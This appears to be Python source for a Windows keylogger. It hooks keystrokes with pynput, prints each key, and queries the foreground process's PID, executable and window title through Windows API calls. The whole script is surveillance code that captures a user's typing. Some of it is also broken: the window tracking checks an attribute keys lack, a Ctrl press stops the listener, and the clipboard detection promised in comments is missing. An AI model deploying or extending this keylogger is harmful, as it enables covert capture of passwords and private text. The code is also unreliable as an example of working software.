from pynput import keyboard  # Import pynput for keyboard event hooking
import win32clipboard  # Import win32clipboard for clipboard operations
from ctypes import *  # Import ctypes for interacting with Windows API

# Load Windows DLLs for API calls
user32 = windll.user32  # User32.dll for window handling
kernel32 = windll.kernel32  # Kernel32.dll for process handling
psapi = windll.psapi  # Psapi.dll for process module information
current_window = None  # Global variable to track the current window


def get_current_process():
    """
    Retrieves and prints information about the current foreground process.
    """
    # Get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # Find the process ID
    pid = c_ulong(0)  # Initialize a ctypes unsigned long for PID
    user32.GetWindowThreadProcessId(hwnd, byref(pid))  # Get PID from window handle

    # Store the process ID as a string
    process_id = "%d" % pid.value

    # Get the executable name
    executable = create_string_buffer(b'\x00' * 512)  # Buffer for executable name
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)  # Open process with query and read access

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)  # Retrieve executable name

    # Get the window title
    window_title = create_string_buffer(b'\x00' * 512)  # Buffer for window title
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)  # Retrieve window title

    # Print process information
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # Close handles to free resources
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def on_press(key):
    """
    Handles keyboard events, logs key presses, and detects clipboard paste actions.
    """
    global current_window  # Reference global variable to track window changes

    try:
        # Check if the active window has changed
        if hasattr(key, 'window') and key.window != current_window:
            current_window = key.window  # Update current window
            get_current_process()  # Log new process information

        # Handle standard ASCII key presses (printable characters)
        if isinstance(key, keyboard.KeyCode) and 32 < ord(key.char) < 127:
            print(key.char, end=' ')  # Print the character
        else:
            # Handle Ctrl+V for clipboard paste
            if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                return False  # Do not print Ctrl key itself
            print("[%s]" % key, end=' ')  # Print non-printable key name

    except AttributeError:
        pass

    return True


# Start listening to keyboard events using pynput
def start_listening():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    start_listening()
